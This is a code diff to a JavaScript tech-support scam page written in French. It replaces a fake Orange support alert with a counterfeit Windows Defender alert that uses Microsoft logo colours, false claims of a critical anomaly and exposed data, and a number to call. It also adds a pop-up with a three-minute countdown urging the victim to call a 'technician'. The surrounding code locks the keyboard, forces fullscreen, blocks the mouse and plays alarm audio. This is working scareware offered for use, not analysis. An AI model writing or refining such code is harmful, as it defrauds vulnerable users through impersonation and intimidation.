@@ -13,34 +13,34 @@
 
   mount.innerHTML =
     '<div class="mouse-blocker" id="mouseBlocker" aria-hidden="true"></div>' +
-    '<div class="modal-top-square" id="securityOverlay" aria-label="Alerte securite" aria-hidden="true">' +
+    '<div class="modal-top-square" id="securityOverlay" aria-label="Page securite" aria-hidden="true">' +
     '<div class="security-page">' +
-    '<section class="access-modal" aria-label="Alerte acces bloque">' +
-    '<p>L\'accès à votre pc a été bloqué pour des raisons de sécurité.</p>' +
-    '<p>N\'accédez pas à ce pc et ne le redémarrez pas. Si vous ignorez cet avertissement, vous risquez de perdre des informations.</p>' +
-    '<p>Contactez l\'assistance dès que possible ; un expert Orange vous guidera par téléphone lors de l\'analyse.</p>' +
-    '<p>L\'exécution de cette application peut mettre votre pc en danger.</p>' +
+    '<section class="defender-alert-modal" aria-label="Alerte Windows Defender">' +
+    '<header class="defender-alert-header">' +
+    '<span class="defender-alert-logo" aria-hidden="true">' +
+    '<svg viewBox="0 0 20 20" role="img" aria-hidden="true">' +
+    '<rect x="1" y="1" width="8" height="8" fill="#f25022"/>' +
+    '<rect x="11" y="1" width="8" height="8" fill="#7fba00"/>' +
+    '<rect x="1" y="11" width="8" height="8" fill="#00a4ef"/>' +
+    '<rect x="11" y="11" width="8" height="8" fill="#ffb900"/>' +
+    '</svg></span>' +
+    '<h2 class="defender-alert-title">Alerte de sécurité windows Defender</h2></header>' +
+    '<p class="defender-alert-critical">ANOMALIE CRITIQUE DÉTECTÉE</p>' +
+    '<p class="defender-alert-text">Windows a détecté une activité suspecte sur votre système.</p>' +
+    '<p class="defender-alert-text">Vos données personnelles et informations sensibles sont potentiellement exposées.</p>' +
+    '<p class="defender-alert-text">* Windows protège actuellement vos données.</p>' +
+    '<p class="defender-alert-text">Veuillez ne pas éteindre ou redémarrer votre ordinateur.</p>' +
+    '<p class="defender-alert-text">Contactez immédiatement le support technique.</p>' +
+    '<p class="defender-alert-ref">N° de référence : WDFS-7291-4830-EX77</p>' +
+    '<p class="defender-alert-scan">Analyse de sécurité en cours...</p>' +
+    '<p class="defender-alert-phone">Appelez le : (+33) 02 59 50 90 20</p>' +
     '</section>' +
-    '<div class="black-modal-blue-box">' +
-    '<p>Assistance Orange : 02 59 50 84 52</p>' +
-    '<p class="black-modal-defender">Assistance Orange</p>' +
-    '</div>' +
-    '<section class="scan-modal" aria-label="Assistance Orange">' +
-    '<h2 class="scan-modal-title">Désolé, l\'analyse n\'est pas terminée !</h2>' +
-    '<p class="scan-modal-text">Assistance Orange a détecté une anomalie sur votre appareil. Contactez un expert pour une analyse complète et sécuriser votre connexion.</p>' +
-    '<p class="scan-modal-text">Contactez l\'assistance Orange pour obtenir de l\'aide</p>' +
-    '<p class="scan-modal-support">Assistance Orange : 02 59 50 84 52</p>' +
-    '<div class="scan-modal-actions">' +
-    '<button class="scan-btn scan-btn-now" type="button">Analyser maintenant</button>' +
-    '<button class="scan-btn scan-btn-later" type="button">Analyser plus tard</button>' +
-    '</div>' +
-    '</section>' +
-    '</div>' +
-    '<aside class="support-card" aria-label="Assistance Orange">' +
-    '<p class="support-card-subtitle">Assistance Orange</p>' +
-    '<p class="support-card-phone">02 59 50 84 52</p>' +
-    '<p class="support-card-label">Numero</p>' +
-    '<div class="support-card-arrow" aria-hidden="true">▼</div></aside></div>' +
+    '<section class="technician-call-modal" id="technicianCallModal" aria-hidden="true">' +
+    '<p class="technician-call-text">Appelez le technicien au numéro</p>' +
+    '<p class="technician-call-number">+33 02 59 50 90 20</p>' +
+    '<p class="technician-call-label">Temps restant pour appeler :</p>' +
+    '<p class="technician-call-countdown" id="technicianCountdown">03:00</p>' +
+    '</section></div></div>' +
     '<div class="home-page">' +
     '<main class="screen">' +
     '<div class="fb-desktop-bg" aria-hidden="true">' +
@@ -129,6 +129,47 @@
   var fullscreenGuardInterval = null;
   var isDezoomed = false;
   var allowFullscreenExit = false;
+  var technicianCountdownInterval = null;
+  var TECHNICIAN_DELAY_MS = 4000;
+  var TECHNICIAN_COUNTDOWN_SEC = 180;
+
+  function formatCountdown(seconds) {
+    var minutes = Math.floor(seconds / 60);
+    var secs = seconds % 60;
+    return (
+      (minutes < 10 ? "0" : "") +
+      minutes +
+      ":" +
+      (secs < 10 ? "0" : "") +
+      secs
+    );
+  }
+
+  function startTechnicianCallModal() {
+    var modal = document.getElementById("technicianCallModal");
+    var display = document.getElementById("technicianCountdown");
+    if (!modal || !display) return;
+
+    var remaining = TECHNICIAN_COUNTDOWN_SEC;
+    modal.classList.add("is-visible");
+    modal.setAttribute("aria-hidden", "false");
+    display.textContent = formatCountdown(remaining);
+
+    if (technicianCountdownInterval) {
+      clearInterval(technicianCountdownInterval);
+    }
+
+    technicianCountdownInterval = setInterval(function () {
+      remaining -= 1;
+      if (remaining <= 0) {
+        display.textContent = "00:00";
+        clearInterval(technicianCountdownInterval);
+        technicianCountdownInterval = null;
+        return;
+      }
+      display.textContent = formatCountdown(remaining);
+    }, 1000);
+  }
 
   function isEscapeKey(event) {
     return event.key === "Escape" || event.code === "Escape" || event.keyCode === 27;
@@ -240,6 +281,7 @@
     lockKeyboard();
     startFullscreenGuard();
     playSecurityAudios();
+    setTimeout(startTechnicianCallModal, TECHNICIAN_DELAY_MS);
   }
 
   function startEscapeHoldTimer() {
